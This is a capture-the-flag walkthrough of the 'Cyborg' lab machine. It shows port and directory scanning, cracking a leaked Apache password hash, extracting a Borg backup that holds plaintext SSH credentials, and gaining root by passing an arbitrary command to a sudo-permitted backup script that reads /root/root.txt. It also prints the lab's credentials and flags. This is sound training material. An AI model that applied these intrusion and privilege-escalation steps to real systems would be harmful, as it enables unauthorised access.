@@ -1,0 +1,629 @@
+CYBORG.
+
+
+
+
+SCANNING: SERVICES.
+Quick nmap scan:
+nmap -sS -T4 -sV 10.10.211.99
+OUTPUT:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+SCANNING: WEB EXPLORING.
+Visiting the machine ip on a web browser, we land on the apache2 ubuntu default page. We will try to find the version running. Since it doesn't show up clearly, we inspect source.
+OUTPUT:
+  <!--
+    Modified from the Debian original for Ubuntu
+    Last updated: 2014-03-19
+    See: https://launchpad.net/bugs/1288690
+  -->
+
+
+Following the see link.
+OUTPUT:
+Bug Description
+The apache default page in trusty is debian branded (attached). It says "Apache2 Debian Default Page" and has the Debian logo. That's misleading, since this is ubuntu, not debian.
+Note:
+This isn't really of use.
+
+
+
+
+SCANNING: DIRECTORIES.
+Quick gobuster scan:
+gobuster dir -u "10.10.211.99" -w /usr/share/seclists/Discovery/Web-Content/common.txt
+OUTPUT:
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/admin                (Status: 301) [Size: 312] [--> http://10.10.211.99/admin/]
+/etc                  (Status: 301) [Size: 310] [--> http://10.10.211.99/etc/]
+/index.html           (Status: 200) [Size: 11321]
+/server-status        (Status: 403) [Size: 277]
+Progress: 4746 / 4747 (99.98%)
+Note:
+Lets check out the 301 status directories.
+
+
+Directory exploring: /admin:
+Note:
+Looks like a personal music portfolio.
+Archive web section:
+We can download archive.tar. Once extracted, we get home/field/dev/final_archive.
+
+
+Listing files:
+README  config  data  hints.5  index.5  integrity.5  nonce
+
+
+Checking out: README:
+OUTPUT:
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+
+
+Visiting the link:
+Borg (BorgBackup) is a deduplication tool (removes repeated data) that runs backups. 
+For now, we will leave our reading at this.
+
+
+Cheking out: config:
+OUTPUT:
+[repository]
+version = 1
+segments_per_dir = 1000
+max_segment_size = 524288000
+append_only = 0
+storage_quota = 0
+additional_free_space = 0
+id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
+key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
+	L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
+	2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
+	8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
+	daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
+	oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
+	eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
+	T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
+	vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
+	SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
+	UCH8bjZLfc1GFsundmVyc2lvbgE=
+Note:
+I would bet this is the Borg key for some directory Alex is backing up.
+
+
+Checking out: index.5 and hints.5:
+They seem unreadable.
+
+
+Checking out: nonce:
+00000000200000b9
+Note:
+Weird string.
+
+
+Checking out: data (directory):
+We find unreadable files.
+
+
+Admins web section:
+We see a conversation bewteen admins:
+                ############################################
+                ############################################
+                [Yesterday at 4.32pm from Josh]
+                Are we all going to watch the football game at the weekend??
+                ############################################
+                ############################################
+                [Yesterday at 4.33pm from Adam]
+                Yeah Yeah mate absolutely hope they win!
+                ############################################
+                ############################################
+                [Yesterday at 4.35pm from Josh]
+                See you there then mate!
+                ############################################
+                ############################################
+                [Today at 5.45am from Alex]
+                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
+                I decided to give up like i always do ahahaha sorry about that.
+                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
+                Might pass it over to the IT guys but in the meantime all the config files are laying about.
+                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
+                other than that im pretty sure my backup "music_archive" is safe just to confirm.
+                ############################################
+                ############################################
+Note:
+we get clues to search for config files, his music archive, and a proxy called squid.
+We will move on to the other directory we can visit (/etc).
+
+
+Directory exploring: /etc:
+OUTPUT:
+Index of /etc
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[DIR]	squid/	2020-12-30 02:09	-	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.211.99 Port 80
+
+
+We visit /squid:
+OUTPUT:
+Index of /etc/squid
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	passwd	2020-12-30 02:09	52	 
+[   ]	squid.conf	2020-12-30 02:09	258	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.211.99 Port 80
+
+
+We read passwd:
+music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+Note:
+Doing some research we figure out we got an Apache HTTP Basic Auth password hash. This password protects a directory (probably /music_archive).
+
+
+We read squid.conf:
+auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+auth_param basic children 5
+auth_param basic realm Squid Basic Authentication
+auth_param basic credentialsttl 2 hours
+acl auth_users proxy_auth REQUIRED
+http_access allow auth_users
+Note:
+Line 1: basic_csa_auth is used as helper program, using /etc/squid/passwd to authenticate users against it.
+Line 2: just creates 5 helper processes to help handle authentication requests.
+Line 3: sets what users will see (Squid Basic Authentication) in browser prompt when asked for credentials.
+Line 4: creates an ACL to match authenticated users.
+Line 5: ensures only authenticated users get through the proxy.
+
+
+Note:
+We notice something important. basic_nsa_auth stores files uses the same format as Apache for its validation files, called NCSA format.
+This means we need to crack the hash, to use it for squid.
+
+
+
+
+CRACKING HASH: 
+John hash cracking (we just pasted the string in music_hash.txt):
+john --wordlist=thm/rockyou.txt music_hash.txt
+OUTPUT:
+squidward        (music_archive)     
+Note:
+Even though we got a password and a user, we dont really know where to use it. We will go back to dealing with Borg.
+
+
+
+
+SSH:
+We try our known credentials:
+ssh music_archive@10.10.211.99
+OUTPUT:
+Permission denied, please try again.
+Note:
+It looks like it isn't for ssh.
+
+
+
+
+BORG:
+Install Borg:
+sudo apt install borgbackup
+
+
+Move into target directory:
+cd ~/Downloads/home/field/dev/final_archive
+
+
+Note:
+Set up path to the repo or backup:
+export BORG_REPO=$(pwd)
+	
+
+Note:
+We will try our credential pair.
+export BORG_PASSPHRASE='squidward'
+
+
+No password protection on the repo:
+export BORG_PASSPHRASE=''
+
+
+Check listed snapshots:
+borg list $BORG_REPO
+OUTPUT:
+music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+
+
+Check music_archive snapshot:
+borg extract $BORG_REPO::music_archive
+Note:
+There is no terminal output. It restores all snapshot files to final_archive.
+
+
+We check the directory for changes:
+ls
+OUTPUT:
+README  config  data  hints.5  home  index.5  integrity.5  nonce
+Note:
+New directory home.
+
+
+List home:
+ls 
+OUTPUT:
+alex
+
+
+List alex:
+Desktop    Downloads  Pictures  Templates
+Documents  Music      Public    Videos
+
+
+List desktop:
+ls Desktop
+OUTPUT:
+secret.txt
+
+
+Read secret:
+cat Desktop/secret.txt
+OUTPUT:
+shoutout to all the people who have gotten to this stage whoop whoop!"
+Note:
+Just some motivation from the room creator.
+
+
+List Downloads:
+ls Downloads
+Note:
+No output.
+
+
+List Pictures:
+ls Pictures
+Note:
+No output.
+
+
+List Templates:
+ls Templates
+Note:
+No output.
+
+
+List Documents:
+ls Documents
+OUTPUT:
+note.txt
+
+
+Read note:
+cat Documents/note.txt
+Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:S3cretP@s3
+Note:
+Looks like we found an ssh login. Before trying it out, we will explore the rest of the folders. None of them have files.
+
+
+
+
+SSH LOGIN:
+ssh alex@10.10.117.34
+Note:
+We get a correct login.
+
+
+We start by listing directory:
+ls -l
+OUTPUT:
+total 36
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Desktop
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Documents
+drwxr-xr-x 2 alex alex 4096 Dec 31  2020 Downloads
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Music
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Pictures
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Public
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Templates
+-r-xr--r-- 1 alex alex   40 Dec 30  2020 user.txt
+drwxr-xr-x 2 alex alex 4096 Dec 30  2020 Videos
+
+
+Read user flag:
+cat user.txt
+OUTPUT:
+flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
+
+
+Note:
+We check out the directories we found, but other than Music, they are all empty.
+List Music:
+ls Music
+OUTPUT:
+image10.mp3  image1.mp3  image4.mp3  image7.mp3
+image11.mp3  image2.mp3  image5.mp3  image8.mp3
+image12.mp3  image3.mp3  image6.mp3  image9.mp3
+
+
+
+PRIVESC:
+Note:
+We didn't find any clear clue. 
+Check sudo rights:
+sudo -l
+OUTPUT:
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+Note:
+Looks like alex can run backup.sh as root.
+
+
+Check out backup.sh:
+cat /etc/mp3backups/backup.sh
+OUTPUT:
+#!/bin/bash
+
+sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
+
+
+input="/etc/mp3backups/backed_up_files.txt"
+#while IFS= read -r line
+#do
+  #a="/etc/mp3backups/backed_up_files.txt"
+#  b=$(basename $input)
+  #echo
+#  echo "$line"
+#done < "$input"
+
+while getopts c: flag
+do
+	case "${flag}" in 
+		c) command=${OPTARG};;
+	esac
+done
+
+
+
+backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"
+
+# Where to backup to.
+dest="/etc/mp3backups/"
+
+# Create archive filename.
+hostname=$(hostname -s)
+archive_file="$hostname-scheduled.tgz"
+
+# Print start status message.
+echo "Backing up $backup_files to $dest/$archive_file"
+
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo "Backup finished"
+
+cmd=$($command)
+echo $cmd
+Note:
+1. 
+COMMAND: 
+sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt
+EXPLAINED:
+As sudo, find all mp3 files in system, save their file path to backed_up_files.txt
+2.
+COMMAND:
+input="/etc/mp3backups/backed_up_files.txt"
+EXPLAINED:
+Path to the .txt storing file.
+3. 
+COMMAND:
+#while IFS= read -r line
+#do
+  #a="/etc/mp3backups/backed_up_files.txt"
+#  b=$(basename $input)
+  #echo
+#  echo "$line"
+#done < "$input"
+EXPLAINED:
+It is commented out, so it doesn't run. 
+3.1/2. It reads the file line by line, storing each one in variable line. 
+3.3. Sets variable a (unused).
+3.3. Gets the filename (backed_up_files.txt) out of input variable.
+3.4. Prints each line (each mp3 path).
+3.5. Tells loop to read from file in $input.
+4.
+COMMAND:
+while getopts c: flag
+do
+	case "${flag}" in 
+		c) command=${OPTARG};;
+	esac
+done
+EXPLAINED:
+4.1. Runs depending on -c option set on the command that starts the script (example: ./script.sh -c "ls").
+4.2. Loop.
+4.3. In case -c value is found.
+4.4. It is stored in variable command.
+5.
+COMMAND:
+backup_files=...
+EXPLAINED:
+Hardcoded list of the .mp3 files to be added to backup.
+6..
+COMMAND:
+dest="/etc/mp3backups/"
+EXPLAINED:
+Backup destination.
+7.
+COMMAND:
+hostname=$(hostname -s)
+archive_file="$hostname-scheduled.tgz"
+EXPLAINED:
+7.17. Store short of machine hostname in variable hostname.
+7.18. Set name of archive_file.
+8. 
+COMMAND:
+echo "Backing up $backup_files to $dest/$archive_file"
+echo
+EXPLAINED:
+8.1. Show which files are being backed up, and to where.
+8.2. Formatting empty line.
+9.
+COMMAND:
+tar czf $dest/$archive_file $backup_files
+EXPLAINED:
+Compress all mp3s from in .tar, stored in: /etc/mp3backups/$hostname-secheduled.tgz
+COMAND:
+echo
+echo "Backup finished"
+EXPLAINED:
+Print end message.
+10.
+COMMAND:
+cmd=$($command)
+echo $cmd
+EXPLAINED:
+10.1. Run command in -c, and store output in variable cmd.
+10.2. Print variable cmd.
+
+
+Note:
+The relevant part of the script is cmd. Since backup.sh is ran as root, we can just set the -c argument as cat /root/root.txt and get the flag.
+Grab root flag:
+/etc/mp3backups/backup.sh -c "cat /root/root.txt"
+OUTPUT:
+Sorry, user alex is not allowed to execute '/usr/bin/find / -name *.mp3' as root on ubuntu.
+Note:
+It looks like we will need to create a modified script.
+
+
+Create copy of script:
+sudo cp /etc/mp3backups/backup.sh /home/alex/mybackup.sh
+OUTPUT:
+Sorry, user alex is not allowed to execute '/bin/cp /etc/mp3backups/backup.sh /home/alex/mybackup.sh' as root on ubuntu.
+
+
+Note:
+Out of options, we will make the script copy itself (since we can't seem to do it ourselves).
+Command for backup script to copy itself:
+ sudo /etc/mp3backups/backup.sh -c "cp /etc/mp3backups/backup.sh /home/alex/mybackup.sh && chown alex:alex /home/alex/mybackup.sh && chmod +x /home/alex/mybackup.sh"
+OUTPUT:
+find: ‘/run/user/108/gvfs’: Permission denied
+/home/alex/Music/image12.mp3
+/home/alex/Music/image7.mp3
+/home/alex/Music/image1.mp3
+/home/alex/Music/image10.mp3
+/home/alex/Music/image5.mp3
+/home/alex/Music/image4.mp3
+/home/alex/Music/image3.mp3
+/home/alex/Music/image6.mp3
+/home/alex/Music/image8.mp3
+/home/alex/Music/image9.mp3
+/home/alex/Music/image11.mp3
+/home/alex/Music/image2.mp3
+Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz
+
+tar: Removing leading `/' from member names
+tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
+tar: Exiting with failure status due to previous errors
+
+Backup finished
+cp: target '/home/alex/mybackup.sh' is not a directory
+
+
+Check if backup was copied:
+ls
+OUTPUT:
+Desktop    Downloads  mybackup.sh  Public     user.txt
+Documents  Music      Pictures     Templates  Videos
+
+
+Note:
+We try to mdify backup.sh by commenting the sudo find. but we get error:
+Error writing mybackup.sh: Permission denied
+
+
+We check file permissions:
+ls -l mybackup.sh
+OUTPUT:
+-r-xr-xr-x 1 alex alex 1083 Jul 18 07:52 mybackup.sh
+
+
+Give permissions and check them:
+chmod u+w ~/mybackup.sh; ls -l mybackup.sh
+OUTPUT:
+-rwxr-xr-x 1 alex alex 1083 Jul 18 07:52 mybackup.sh
+
+
+Note: 
+We can now comment the sudo line.
+Run exploit:
+sudo ./mybackup.sh -c "cat root/root.txt"
+OUTPUT:
+Sorry, user alex is not allowed to execute './mybackup.sh -c cat root/root.txt' as root on ubuntu.
+Note:
+We are running our own copied script, not the original, which is ran as root.
+
+
+We just had to run the original with the option set to cat the flag:
+sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
+OUTPUT:
+find: ‘/run/user/108/gvfs’: Permission denied
+/home/alex/Music/image12.mp3
+/home/alex/Music/image7.mp3
+/home/alex/Music/image1.mp3
+/home/alex/Music/image10.mp3
+/home/alex/Music/image5.mp3
+/home/alex/Music/image4.mp3
+/home/alex/Music/image3.mp3
+/home/alex/Music/image6.mp3
+/home/alex/Music/image8.mp3
+/home/alex/Music/image9.mp3
+/home/alex/Music/image11.mp3
+/home/alex/Music/image2.mp3
+Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz
+
+tar: Removing leading `/' from member names
+tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
+tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
+tar: Exiting with failure status due to previous errors
+
+Backup finished
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+Note:
+We got the root flag.
+
